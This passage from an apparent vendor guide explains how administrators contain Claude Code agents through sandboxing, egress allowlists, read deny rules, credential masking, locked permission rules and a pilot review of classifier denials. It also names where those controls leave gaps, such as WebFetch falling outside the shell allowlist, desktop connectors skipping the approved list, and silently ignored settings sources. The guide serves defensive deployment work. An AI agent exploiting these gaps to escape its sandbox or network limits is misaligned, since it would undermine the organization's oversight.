<tr><td class="text-body-3"><span class="cst-p"><strong>Is it allowed?</strong></span></td><td class="text-body-3"><span class="cst-p">Can be turned off in the desktop app (<code class="text-inline-code">disableDesktopLocalSessions</code>), not in the terminal</span></td><td class="text-body-3"><span class="cst-p">Cloud sessions toggle for the organization</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>How contained is it?</strong></span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> sandbox on for all local sessions (<code class="text-inline-code">sandbox.enabled</code>)</span><span class="cst-p"><strong>Locked:</strong> no running without it and no unsandboxed retries (<code class="text-inline-code">failIfUnavailable</code>, <code class="text-inline-code">allowUnsandboxedCommands: false</code>)</span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> Owners create shared environments with settings members can't change on the Cloud environments page, and pick one as the organization's default environment</span><span class="cst-p"><strong>Locked:</strong> run Claude Code on infrastructure you operate. On Anthropic-hosted environments, developers can still create personal ones with their own settings</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>Where can it connect?</strong></span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> a managed list of approved sites that developers can add to (<code class="text-inline-code">sandbox.network.allowedDomains</code>)</span><span class="cst-p"><strong>Locked:</strong> only your list counts (<code class="text-inline-code">allowManagedDomainsOnly</code>). The list covers shell commands, so limit the WebFetch tool with its own permission rules</span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> Anthropic's trusted list by default (package registries, GitHub, cloud SDKs), or the network access Owners set on each shared environment (connector, GitHub, and Anthropic API traffic isn’t limited by this setting)</span><span class="cst-p"><strong>Locked:</strong> use <a href="https://code.claude.com/docs/en/self-hosted-environments">self-hosted environments</a> (public beta), where your own network boundary limits connections. Anthropic-hosted environments have no organization-wide allowlist</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>What can it read?</strong></span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> Read deny rules for sensitive paths (<code class="text-inline-code">permissions.deny</code>)</span><span class="cst-p"><strong>Locked:</strong> restrict file-tool reads to the project and block listed paths (<code class="text-inline-code">permissions.blockReadsOutsideWorkingDirectories</code>, <code class="text-inline-code">sandbox.filesystem.denyRead</code>)</span></td><td class="text-body-3"><span class="cst-p"><strong>Baseline:</strong> the same Read deny rules</span><span class="cst-p"><strong>Locked:</strong> no full lock. Limit the Claude GitHub App to approved repositories to control what sessions can clone and push. Developers can still upload a local repository from the terminal.</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>What credentials can it use?</strong></span></td><td class="text-body-3"><span class="cst-p">Block credential files with Read deny rules and set credential masking (<code class="text-inline-code">sandbox.credentials</code>)</span></td><td class="text-body-3"><span class="cst-p">Owners store keys as Network secrets on shared environments, never as environment variables.</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>Which connectors can it use?</strong></span></td><td class="text-body-3" colspan="2"><span class="cst-p"><strong>Baseline:</strong> an approved list that developers can add to (<code class="text-inline-code">allowedMcpServers</code>).</span><span class="cst-p"><strong>Locked:</strong> only your list counts (<code class="text-inline-code">allowManagedMcpServersOnly</code>)</span><span class="cst-p">Connectors the desktop app delivers skip this list and are limited in organization connector settings.</span></td></tr>
<tr><td class="text-body-3"><span class="cst-p"><strong>What can it do without asking?</strong></span></td><td class="text-body-3" colspan="2"><span class="cst-p"><strong>Baseline:</strong> managed deny and ask rules, with developers adding their own allow rules.</span><span class="cst-p"><strong>Locked:</strong> only your rules and hooks apply, and bypass mode is off (<code class="text-inline-code">allowManagedPermissionRulesOnly</code>, <code class="text-inline-code">allowManagedHooksOnly</code>, <code class="text-inline-code">permissions.disableBypassPermissionsMode</code>).</span></td></tr>
</tbody>
</table>

### Which settings apply

Managed settings can reach a session three ways: server-managed settings from the Claude admin console, an MDM or OS-level policy, and a managed settings file. Only server-managed settings reach Anthropic-hosted cloud sessions.

![Diagram of managed settings sources in priority order: server-managed settings, MDM or OS policy, managed settings files, then the HKCU registry, with a few keys read from every admin source.](https://assets.claude.com/e35ee53fc465db82afbb8f031f5b30e98be5bf5f.png)

By default, Claude Code uses the first source that has a policy key. Setting managedSourcesBehavior to “merge” combines the admin sources.

By default, [Claude Code applies only the highest-ranked source and ignores the others](https://code.claude.com/docs/en/managed-settings), in that order, with no warning. If your MDM profile turns on the sandbox and a managed settings file holds the egress allowlist, the allowlist never applies.

Pro tip

Deliver managed settings by one route. If you need more than one, set [`managedSourcesBehavior`](https://code.claude.com/docs/en/settings-reference) to `"merge"`, and run `/status` on a test machine to confirm which sources applied.

## 06 Getting started

The controls in this guide work as layers, each covering what the others miss. A pilot on one repository shows how the layers hold up in your environment before you widen the rollout.

Pilot checklist

**Tier your repositories and run the vendor review.** Rank the repositories the agent will touch by sensitivity, then check your provider against the requirements in Chapter 1.

**Pick a repository from your lowest tier,** such as an internal tool under active development. It should be busy enough to generate real sessions and low-stakes enough that a miss costs little.

**Deploy a central policy baseline.** Set sandboxing on in strict mode, deny rules on credential paths, credential masking, an egress allowlist, and auto mode. Set and configure a default cloud environment. Add the `security-guidance` plugin and whatever hooks enforce your non-negotiable rules.

**Turn on the record.** Enable OpenTelemetry export with tool content (beta), and make sure sandbox and egress logs are being kept.

**Run for two weeks without changing the policy,** so every result traces back to one configuration.

**Review what the layers did.** Look at classifier denials, sandbox blocks, unsandboxed retry attempts, and refused egress. Each one is either a control doing its job or a legitimate need the baseline didn’t anticipate. Add the allowlist entries the work needed rather than relaxing deny rules.

**Score the pilot against Chapter 1’s five questions before** you widen to a second team.

Pro tip

If you’re an Owner or the admin who manages your organization’s Claude Code settings, you can use Claude for a first pass. Give it this guide and your managed settings file, and ask which settings from Chapter 5’s table are present, missing, or set differently. Have it quote the setting and value behind each finding. Treat the result as a gap list, not an audit: it can’t see your admin console or other machines, so confirm what it finds there and in the docs.

Done right, this secure framework will accelerate rather than slow your team’s ability to run at full speed with coding agents.

---

*¹ Salesforce Ventures is an investor in Anthropic.*

## Related articles

Explore more product news and best practices for teams building with Claude.

[ArticleNov 17, 2026

### Using a "chaos loop" to harden the Claude Docs launch: 60 server errors across billions of requests

How Claude spent two weeks load testing a staging cluster, breaking the Claude Docs service on purpose and fixing what fell over before launch, and what made the service legible enough for Claude to close the loop.

Claude CodeClaude apps

(opens in new tab)](https://claude.dev/blog/chaos-loop-claude-docs-launch/)[ArticleNov 16, 2026

### How the Claude Code team thinks about verification

How end-to-end, property and differential tests let coding agents verify their work with evidence, and what the Claude Code team does to keep its verifiers honest.

Claude Code

(opens in new tab)](https://claude.dev/blog/how-the-claude-code-team-thinks-about-verification/)[ArticleNov 13, 2026

### Building always-on agents

Always-on agents run indefinitely, deciding how and when to act across many sessions. This guide walks through their core primitives and how they fit together.

Claude Platform](https://claude.com/resources/articles/building-always-on-agents)[ArticleNov 13, 2026

### The Claude Tag guide for startups

How leading startups use Claude Tag to ship faster and scale operations

Claude Tag](https://claude.com/resources/articles/claude-tag-guide-for-startups)

## Transform how your organization operates with Claude

[See pricing](https://claude.com/pricing)[Contact sales](https://claude.com/contact-sales)

### Get the developer newsletter

Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.

Please provide your email address if you'd like to receive our monthly developer newsletter. You can unsubscribe at any time.
